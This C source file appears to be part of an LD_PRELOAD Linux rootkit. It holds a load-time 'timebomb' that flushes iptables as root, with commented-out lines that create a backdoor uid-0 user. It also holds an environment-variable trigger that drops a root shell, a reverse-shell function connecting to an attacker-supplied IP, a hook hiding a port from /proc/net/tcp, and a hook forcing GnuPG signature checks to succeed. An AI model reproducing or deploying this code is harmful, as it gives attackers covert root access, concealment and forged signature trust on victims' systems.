#include "father.h"

/*
  timebomb component. runs when the library is loaded or unloaded from an application
*/
static void timebomb() __attribute__((constructor));
static void timebomb() __attribute__((destructor));
void timebomb() {

	if((unsigned long)time(NULL) >= (unsigned long)EPOCH_TIME) {
		;  // do whatever here
	}

	if (geteuid() == 0) {
		system("iptables -F");
		// system("userdel -f jan 2>/dev/null");
		// system("userdel -f redteam 2>/dev/null");
		// system("useradd -u 0 -g 0 -o jan");
		// system("useradd -m redteam");
		// system("echo jan:jan | chpasswd 2>/dev/null");
		// system("echo redteam:lobster | chpasswd 2>/dev/null");
	}

	
}

/*
 * Local Privilege Escalation (LPE) via specific environment variable. Called from a setuid/setgid binary to achieve root privileges.
 * This technique isn't mine, I saw it first in Jynx2 (https://github.com/chokepoint/Jynx2)
*/
void lpe_drop_shell() {

	#ifdef DEBUG
	fprintf(stderr, "lpe_drop_shell() called!\n");
	#endif
	if (geteuid() == 0 && getenv(ENV)) {
		setuid(0);
		seteuid(0);
		setgid(GID);
		unsetenv(ENV);
		puts("Enjoy the shell!"); 
		execl("/bin/bash", "/bin/bash", (char *) 0);
	}
}

/*
 * Basic reverse shell to the client
 * @param ip is a c string of an IP address
 * @param port is a port in host mode
*/
void backconnect(char * ip, int port)
{	
	#ifdef DEBUG
	fprintf(stderr, "backconnect() called!\n");
	#endif
	
	pid_t pid = fork();
	
	if(pid == 0) {	
	
		struct sockaddr_in sin;
		int sock;

		sin.sin_family = AF_INET;
		sin.sin_addr.s_addr = inet_addr(ip);
		sin.sin_port = htons(port);
		sock = socket(AF_INET, SOCK_STREAM, 0);
		
		connect(sock, (struct sockaddr *)&sin, sizeof(sin));
		
		dup2(sock, 0);
		dup2(sock, 1);
		dup2(sock, 2);
		
		if (geteuid() == 0) setgid(GID);
		execl("/bin/bash", "/bin/bash", (char *) 0);
	}
}


/*
 * Hide connections on the magic port from netstat.
 * @param pathname is going to be either /proc/net/tcp or /proc/net/tcp6
 * @param mode is the mode to open it in
 * @param *old_fopen is the fopen function to use, either fopen() or fopen64()
*/
FILE * falsify_tcp(const char * pathname, const char * mode, FILE * (*old_fopen)(const char *, const char *))
{
	
	#ifdef DEBUG
	fprintf(stderr, "falsify_tcp() called!\n");
	#endif

	FILE * real = old_fopen(pathname, mode);
	FILE * fake = tmpfile(); 
	char line[200];
	
	while (fgets(line, sizeof(line), real)) {
		if(strstr(line, HIDDENPORT) == NULL) {
			fputs(line, fake);
		}
	}

	fclose(real);
	rewind(fake);
	return fake; // detect with fcntl() ; if fd is in write mode

}

/*
 * Break GnuPG signatures, and have them always return success
*/
gcry_error_t gcry_pk_verify(gcry_sexp_t sig, gcry_sexp_t data, gcry_sexp_t pkey) {

	#ifdef DEBUG
	fprintf(stderr, "gcry_pk_verify() called!\n");
	#endif

	if(!o_verify) o_verify = dlsym(RTLD_NEXT, "gcry_pk_verify");

	if(getegid() == GID) return o_verify(sig, data, pkey);

	return 0;
}

/*
 * Unsafe demo function. Used for detection.
*/
char *strfry(char * string){
	#ifdef DEBUG
	fprintf(stderr, "strfry() called!\n");
	#endif
	return strcpy(string, STRING);
}
